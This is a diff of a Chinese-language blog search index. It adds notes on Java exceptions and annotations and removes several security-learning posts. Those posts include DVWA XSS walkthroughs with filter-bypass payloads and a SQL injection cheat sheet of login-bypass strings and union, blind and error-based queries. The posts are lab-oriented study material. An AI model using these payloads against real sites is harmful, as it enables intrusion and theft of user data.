+<h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>我们把 Java 中程序执行的不正常情况称为<strong>”异常“</strong>（语法和逻辑错误不算）</p>
+<h4 id="1-Error"><a href="#1-Error" class="headerlink" title="1. Error"></a>1. Error</h4><p>Java虚拟机无法解决的严重问<br>比如：JVM系统内部错误，栈溢出或者OOM</p>
+<h4 id="2-Exception"><a href="#2-Exception" class="headerlink" title="2. Exception"></a>2. Exception</h4><p>可以使用针对性的代码解决的问题<br>比如：空指针访问</p>
+<h5 id="2-1-运行时异常"><a href="#2-1-运行时异常" class="headerlink" title="2.1 运行时异常"></a>2.1 运行时异常</h5><p>此异常编译器查不出来，一般是编程时程序员的逻辑错误。java.lang.RuntimeException类及它的子类都是运行时异常。<br>对于运行时异常，一般可以不做处理。</p>
+<h5 id="2-2-编译异常"><a href="#2-2-编译异常" class="headerlink" title="2.2 编译异常"></a>2.2 编译异常</h5><p>编译时异常，是编译器必须要处理的异常。</p>
+<p><img src="https://colson-max.github.io/2022/04/24/JavaSE/2.png" alt="2"></p>
+<h3 id="异常处理方式"><a href="#异常处理方式" class="headerlink" title="异常处理方式"></a>异常处理方式</h3><h4 id="try-catch-finally"><a href="#try-catch-finally" class="headerlink" title="try-catch-finally"></a>try-catch-finally</h4><p>程序员在代码中捕获发生的异常，自行处理。</p>
+<p>Java提供了 try块 和 catch块 来处理异常。try 块用于包含可能出错的代码。catch 块用于处理 try 块中发生的异常。可以根据需要在程序中有多个try.catch块。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Try_And_Catch</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            String str = <span class="string">&quot;测试&quot;</span>;</span><br><span class="line">            <span class="keyword">int</span> a = Integer.parseInt(str);</span><br><span class="line">            System.out.println(<span class="string">&quot;数字：&quot;</span> + a );</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NumberFormatException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;异常信息：&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;最后代码块被执行&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;程序继续&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1.如果发生异常，则异常之后的代码不会被执行，直接进入 catch 板块</span></span><br><span class="line"><span class="comment">2.如果没发生异常，则顺序执行 try 板块，不会进入 catch 板块</span></span><br><span class="line"><span class="comment">3.如果希望是否发生异常都执行某段代码，则使用 finally 板块</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Try_And_Catch02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person = <span class="keyword">null</span>;</span><br><span class="line">            System.out.println(person.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException e)&#123;           <span class="comment">//空指针异常在前</span></span><br><span class="line">            System.out.println(<span class="string">&quot;空指针异常：&quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4.使用 try 代码块可能有多个异常。我们可以使用多规格 catch 语句来捕获多个不同的异常（进行不同的异常处理）</span></span><br><span class="line"><span class="comment">    要求：父类异常在后，子类在前</span></span><br><span class="line"><span class="comment"> 如果发生异常，只会匹配一个catch块</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;colson&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Try_And_Catch03</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> n1 = <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">int</span> n2 = <span class="number">0</span>;</span><br><span class="line">            System.out.println(n1/n2);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;执行了finally&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;程序继续执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 5. try 和 finally 配合使用，相当于没有捕获异常，因此程序会直接推出。</span></span><br><span class="line"><span class="comment"> *  eg:不管有无异常都必须执行的逻辑代码</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="throws"><a href="#throws" class="headerlink" title="throws"></a>throws</h4><p>将发生的异常抛出，交给调用方法处理，最顶级的处理者就是JVM</p>
+<h2 id="Java-注解"><a href="#Java-注解" class="headerlink" title="Java-注解"></a>Java-注解</h2><hr>
+<p><strong>注解在 JavaSE 基础中，使用的并不多，在 JavaEE 中比重较大，常用来配置切面、XML配置等。</strong></p>
+<p>注解(Annotation)用于修饰解释包、类、方法、属性、构造器、局部变量等数据信息。<br>和注释一样，注解不影响程序的逻辑，但是注解可以被编译运行，相当于代码中的补充信息。</p>
+<h3 id="三个基本注解"><a href="#三个基本注解" class="headerlink" title="三个基本注解"></a>三个基本注解</h3><h4 id="1-Override"><a href="#1-Override" class="headerlink" title="1. @Override"></a>1. @Override</h4><p>限定某个方法，是重写父类方法，该注解只能用于“方法”</p>
+<h4 id="2-Deprecated"><a href="#2-Deprecated" class="headerlink" title="2. @Deprecated"></a>2. @Deprecated</h4><p>用于表示某个程序元素，该注解可以修饰方法 、类、字段、参数等。</p>
+<h4 id="3-SuppressWarnings-“all”"><a href="#3-SuppressWarnings-“all”" class="headerlink" title="3. @SuppressWarnings(“all”)"></a>3. @SuppressWarnings(“all”)</h4><p>抑制编译器警告</p>
+<h3 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h3><h4 id="1-JDK的元注解用于修饰其他注解"><a href="#1-JDK的元注解用于修饰其他注解" class="headerlink" title="1.JDK的元注解用于修饰其他注解"></a>1.JDK的元注解用于修饰其他注解</h4><h4 id="2-种类"><a href="#2-种类" class="headerlink" title="2.种类"></a>2.种类</h4><ul>
+<li>Retention //指定注解的作用范围，三种SOURCE,CLASS,RUNTIME</li>
+<li>RetentionPolicy.SOURCE: 编译器使用后，直接丢弃这种策略的注释</li>
+<li>RetentionPolicy.CLASS: 编译器将把注解记录在 class 文件中，当运行 Java 程序时, JVM 不会保留注解。这是默认值</li>
+<li>RetentionPolicy.RUNTIME:编译器将把注解记录在 class 文件中，当运行 Java 程序时, JVM 会保留注解. 程序可以通过反射获取该注解</li>
+<li>Target // 指定注解可以在哪些地方使用</li>
+<li>Documented //指定该注解是否会在javadoc 体现</li>
+<li>Inherited //子类会继承父类注解</li>
+</ul>
+<h2 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java-反射"></a>Java-反射</h2><hr>
 <h3 id="动态语言和静态语言"><a href="#动态语言和静态语言" class="headerlink" title="动态语言和静态语言"></a>动态语言和静态语言</h3><ul>
 <li><p>动态语言</p>
 <p>运行时可以改变其结构的语言。主要的动态语言有：C# , Js , php , python 等</p>
@@ -1231,208 +1391,6 @@
 ]]></content>
       <tags>
         <tag>-Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DVWA-XSS(DOM)</title>
-    <url>/2022/04/29/DVWA-XSS-DOM/</url>
-    <content><![CDATA[<h1 id="DVWA-XSS-DOM"><a href="#DVWA-XSS-DOM" class="headerlink" title="DVWA-XSS(DOM)"></a>DVWA-XSS(DOM)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。</p>
-<p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过<strong>JS脚本</strong>对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
-<hr>
-<p>参考：</p>
-<p><a href="https://www.freebuf.com/articles/web/253358.html">https://www.freebuf.com/articles/web/253358.html</a></p>
-<hr>
-<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><ul>
-<li>查看服务端源代码，发现什么都没有，那我们可以尝试直接注入</li>
-</ul>
-<p><img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/1.png" alt="1"></p>
-<ul>
-<li><p>主页面随便选个 English ，点击 Select</p>
-<img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/2.png" alt="2" style="zoom:67%;"></li>
-</ul>
-<p>​    我们发现上方 url 处多了一串字符 “ <strong>?default=English</strong> “</p>
-<ul>
-<li><p>我们可以直接构造语句</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/3.png" alt="3" style="zoom:67%;"></li>
-</ul>
-<hr>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>源码分析：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">	<span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Do not allow script tags</span></span><br><span class="line">	<span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">		header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>我们可以发现<code>&lt;script&gt;</code>被过滤掉了。</p>
-<ul>
-<li><p>那我们可以使用闭合<code>&lt;/option&gt;&lt;/select&gt;</code>标签构造xss事件。</p>
-</li>
-<li><p>键入 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;iframe onload=alert(/xss/)&gt;</code></p>
-<p><img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/4.png" alt="4"></p>
-</li>
-</ul>
-<hr>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>一样的先分析源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># White list the allowable languages</span></span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">			<span class="comment"># ok</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>我们发现只允许default=French、English、German、Spanish、这几个通过。</p>
-<ul>
-<li><p>非常明显的<strong>白名单过滤</strong></p>
-</li>
-<li><p>所以我们需要绕过白名单进行过滤</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">default=English#<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(/xss/)</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/5.png" alt="5"></p>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>-DVWA</tag>
-        <tag>-XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入</title>
-    <url>/2022/04/29/SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
-<li><strong>sql注入</strong>可以说是 web 安全的重点，也可以说是学习安全的必经之路，非常基础，非常使用。</li>
-</ul>
-<p>基础的东西可以多学一学，而且 SQL 注入 的相关知识点可以覆盖的非常广，复习这部分内容可以让我重温一遍很多知识点，包括 一些 SQL 语句，web基础知识，数据库的一些结构等等。</p>
-<hr>
-<p>参考：</p>
-<ul>
-<li><a href="https://ctf-wiki.org/web/sqli/">https://ctf-wiki.org/web/sqli/</a></li>
-<li></li>
-<li><a href="http://drops.xmd5.com/static/drops/tools-1548.html">http://drops.xmd5.com/static/drops/tools-1548.html</a></li>
-</ul>
-<hr>
-<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul>
-<li>SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。</li>
-<li>攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。</li>
-<li>如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。</li>
-</ul>
-<hr>
-<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><ul>
-<li><p>Burp Suite</p>
-<p>非常好用的工具，可以说是web必备的工具了。基本的拦截、抓包、改包、分析、加密解密都可以实现。还有很多功能我还没有弄明白，总之它很强大就对了，真心推荐 。</p>
-</li>
-<li><p>HackBar</p>
-<p>小狐自带的拓展程序，很简洁很方便，也可以实现很多的功能，可以说是最实用的，我个人用的少。</p>
-</li>
-<li><p>sqlmap</p>
-<p>非常强大的自动化SQL注入工具，主要是扫描并且自动注入，目前支持市场上大部分数据库，功能甚至包括数据库指纹识别、数据库枚举、数据提取、访问等。非常强大，并且可以跨平台使用。</p>
-<p>[^但是我个人不建议用sqlmap，它的操作可以说难度并不大，主要是输入命令，对我们的实际学习帮助不大，而且就平时的靶机训练，根本不需要扫目录，我们学安全初衷是要维护数据，而非窃取数据，而sqlmap的命令比较复杂，上手难度还是有的，建议从基础知识开始学，手工注入。]: </p>
-</li>
-</ul>
-<hr>
-<h2 id="常见的注入参数"><a href="#常见的注入参数" class="headerlink" title="常见的注入参数"></a>常见的注入参数</h2><ul>
-<li>user()</li>
-<li>database()</li>
-<li>version()</li>
-<li>concat()</li>
-<li>group_concat()</li>
-<li>concat_ws()</li>
-<li>hex() / unhex()</li>
-<li>load_file()</li>
-</ul>
-<hr>
-<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><ul>
-<li>admin’ – 或者 admin’ #</li>
-<li>‘ or 1=1 – 或者 ‘ or 1=1 #</li>
-<li>‘) or ‘1’=’1 – 或者 ‘) or (‘1’=’1 – </li>
-</ul>
-<hr>
-<h2 id="注入语句小技巧"><a href="#注入语句小技巧" class="headerlink" title="注入语句小技巧"></a>注入语句小技巧</h2><h3 id="行间注释"><a href="#行间注释" class="headerlink" title="行间注释"></a>行间注释</h3><hr>
-  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> admin;<span class="comment">-- 注释符后面有个空格 </span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><h1 id><a href="#" class="headerlink" title></a></h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> admin;#这个注释符后面不用空格</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="行内注释"><a href="#行内注释" class="headerlink" title="行内注释"></a>行内注释</h3><ul>
-<li><p>/* 注释内容 */</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span><span class="comment">/*comment*/</span>sampletable`   DR<span class="comment">/**/</span>OP<span class="comment">/*绕过过滤*/</span>sampletable`   <span class="keyword">SELECT</span><span class="comment">/*替换空格*/</span>password<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>Members</span><br></pre></td></tr></table></figure></li>
-<li><p>/* mysql专属 */</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="comment">/* 注释内容 */</span> <span class="number">1</span> <span class="keyword">FROM</span> tablename</span><br></pre></td></tr></table></figure></li>
-</ul>
-<hr>
-<h2 id="注入语句备忘"><a href="#注入语句备忘" class="headerlink" title="注入语句备忘"></a>注入语句备忘</h2><h3 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select database();</span><br><span class="line">select schema_name from information_schema.schemata;</span><br></pre></td></tr></table></figure>
-
-<h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><ul>
-<li><p>union  查询</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- MySQL 4版本时用version=9，MySQL 5版本时用version=10</span><br><span class="line"> /* 列出当前数据库中的表 */</span><br><span class="line">union select group_concat(table_name) from information_schema.tables where version=10;</span><br><span class="line">/* 列出所有用户自定义数据库中的表 */</span><br><span class="line">union select table_name from information_schema.tables where table_schema=database();   </span><br><span class="line">select table_schema, table_name from information_schema.tables where table_schema!=&#x27;information_schema&#x27; and table_schema!=&#x27;mysql&#x27;;</span><br></pre></td></tr></table></figure></li>
-<li><p>盲注</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> substr(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>报错</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));</span><br><span class="line">-- 在5.1.5版本中成功。</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>-SQL注入</tag>
-        <tag>-Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DVWA-XSS-Reflected</title>
-    <url>/2022/05/06/DVWA-XSS-Reflected/</url>
-    <content><![CDATA[<h1 id="DVWA-XSS-Reflected"><a href="#DVWA-XSS-Reflected" class="headerlink" title="DVWA-XSS(Reflected)"></a>DVWA-XSS(Reflected)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>反射型XXS是一种非持久性的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。</p>
-<hr>
-<p>参考：</p>
-<p><a href="https://segmentfault.com/a/1190000019484055">https://segmentfault.com/a/1190000019484055</a></p>
-<hr>
-<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>点开源码分析</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">	<span class="comment">// Feedback for end user</span></span><br><span class="line">	<span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>我们会发现没有任何的过滤和检查。那我们可以直接攻击。</p>
-<ul>
-<li><p>构造</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
-<li><p><img src="https://colson-max.github.io/2022/05/06/DVWA-XSS-Reflected/1.png" alt="1"></p>
-</li>
-</ul>
-<hr>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>同样我们点开源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>我们可以看到源码中，使用 <strong>str_replace</strong> 函数将输入的<code>&lt;script&gt;</code>删除。也就实现了<code>&lt;script&gt;</code>的过滤。</p>
-<ul>
-<li><p>双写绕过</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://colson-max.github.io/2022/05/06/DVWA-XSS-Reflected/2.png" alt="2"></p>
-</li>
-<li><p>大小写绕过</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>输入其他标签</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>这三种方法都可以绕过过滤，达到我们的预期效果。</p>
-<hr>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>打开源码分析：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>代码使用了<code>preg_replace</code>函数执行一个正则表达式的搜索和替换，其中<code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code>是正则表达式<code>(.*)</code>表示贪婪匹配，<code>/i</code>表示不区分大小写</li>
-<li>所以在High级别的代码中，所有关于<code>&lt;script&gt;</code>标签均被过滤删除了</li>
-</ul>
-<p>不过我们可以通过输入其它标签的方法来进行过滤：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>-DVWA</tag>
-        <tag>-XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Spring Security OAuth2远程命令执行漏洞(CVE-2016-4977)</title>
-    <url>/2022/05/13/Spring-Security-OAuth2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2016-4977/</url>
-    <content><![CDATA[<h2 id="Spring-Security-OAuth2远程命令执行漏洞-CVE-2016-4977"><a href="#Spring-Security-OAuth2远程命令执行漏洞-CVE-2016-4977" class="headerlink" title="Spring Security OAuth2远程命令执行漏洞(CVE-2016-4977)"></a>Spring Security OAuth2远程命令执行漏洞(CVE-2016-4977)</h2><hr>
-<p>参考：<a href="https://www.freebuf.com/vuls/329753.html">https://www.freebuf.com/vuls/329753.html</a></p>
-<p><a href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2016-4977">https://github.com/vulhub/vulhub/tree/master/spring/CVE-2016-4977</a></p>
-<hr>
